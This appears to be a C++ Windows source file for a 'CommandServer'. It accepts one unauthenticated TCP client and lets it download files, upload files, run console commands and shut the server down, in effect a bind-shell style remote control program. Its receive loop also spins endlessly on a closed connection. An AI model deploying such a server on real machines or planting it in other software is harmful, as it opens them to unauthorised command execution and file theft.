#include "CommandServer.h"


int __cdecl main(void)
{
    bool exit = false;
    while (!exit)
    {
        SOCKET ClientSocket = INVALID_SOCKET;
        SOCKET ListenSocket = INVALID_SOCKET;

        if (int err = Server_Init(ListenSocket))//1 = error; 0 = good
        {
            std::cout << "\n[!]Init Failed With ERROR " << err;
            return 0;
        }

        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);

        if (ClientSocket == INVALID_SOCKET)
        {
            printf("[!]Accept Failed With Error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }
        else
        {
            printf("ACCEPT CONNECTION\n");
            //closesocket(ListenSocket);
        }


        char recvbuf[COMMAND_BUFLEN];
        int recvbuflen = COMMAND_BUFLEN;

        // Receive until the peer shuts down the connection
        int iResult = 1;
        while (iResult > 0)
        {
            do
            {
                iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
            } while (iResult <= 0);

            switch (recvbuf[0])
            {
            case COMMAND_READ:
                std::cout << "\nSending file \"" << recvbuf + sizeof(char) * HEADER_SIZE + sizeof(' ') << "\"";//DEBUG
                SendFile(ClientSocket, recvbuf + sizeof(char) * HEADER_SIZE + sizeof(' '));
                break;

            case COMMAND_WRITE:
                std::cout << "\nRecieving a file";//DEBUG
                RecvFile(ClientSocket);
                break;

            case COMMAND_CONSOLE:
                ExecuteCommandConsole(recvbuf);
                break;

            case COMMAND_EXIT:
                std::cout << "\n[:]EXIT Command Recieved!";
                closesocket(ClientSocket);
                WSACleanup();
                iResult = 0;//exit communication loop
                break;

            case COMMAND_SHUTDOWN:
                std::cout << "\n[:]SHUTDOWN Command Recieved!";
                closesocket(ClientSocket);
                WSACleanup();
                exit = true;//exit listen loop
                iResult = 0;//exit communication loop
                break;
            }
        }
        closesocket(ListenSocket);
        WSACleanup();
    }

    return 0;
}